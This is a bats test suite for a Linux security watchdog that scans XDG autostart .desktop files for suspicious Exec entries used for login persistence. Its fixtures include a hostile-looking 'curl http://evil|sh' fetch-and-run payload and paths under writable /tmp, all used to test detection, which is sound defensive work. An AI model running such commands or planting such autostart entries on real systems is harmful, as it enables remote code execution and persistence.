#!/usr/bin/env bats
# L2 bats functional tests for the xdg-autostart-watchdog scan script.
#
# A .desktop file in an autostart dir runs its `Exec=` at the start of every
# desktop session (root's session for /root/.config/autostart, every
# session for /etc/xdg/autostart) — a login/session persistence vector. An
# Exec under a writable root, relative-with-slash, or carrying an injection
# pattern is alert; bare PATH-resolved commands are normal.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# autostart dir in a tmp sandbox via SELFDEF_XDG_DIRS.
#
# Run with: bats packaging/test/L2-xdg-autostart-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd/xdg-autostart-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    AUTOD="${TMP}/autostart"; mkdir -p "${AUTOD}"
    DESK="${AUTOD}/app.desktop"
}

teardown() { rm -rf "${TMP}"; }

desktop() { printf '[Desktop Entry]\nType=Application\nName=App\nExec=%s\n' "$1"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_XDG_PROFILE="${PROFILE:-report}" \
    SELFDEF_XDG_BASELINE="${BASELINE}" \
    SELFDEF_XDG_DIRS="${DIRS:-$AUTOD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no autostart dirs → ok / no_autostart_dirs" {
    DIRS="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_autostart_dirs"'
    cap | grep -q '"severity":"ok"'
}

@test "benign autostart entry, first run → ok / baseline_initial" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / xdg_autostart_intact" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xdg_autostart_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "Exec under a writable root → alert / xdg_autostart_suspicious" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd                                   # benign baseline
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xdg_autostart_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "Exec carrying a curl|sh payload → alert" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "curl http://evil|sh"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a relative-with-slash Exec → alert" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop ./rel/x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign Exec change → warn / xdg_autostart_changed" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /usr/bin/blueman-applet > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"xdg_autostart_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "a /usr/bin Exec is NOT flagged" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a bare PATH-resolved Exec is NOT flagged" {
    desktop 'pulseaudio --start' > "${DESK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    desktop /usr/bin/nm-applet > "${DESK}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious Exec" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
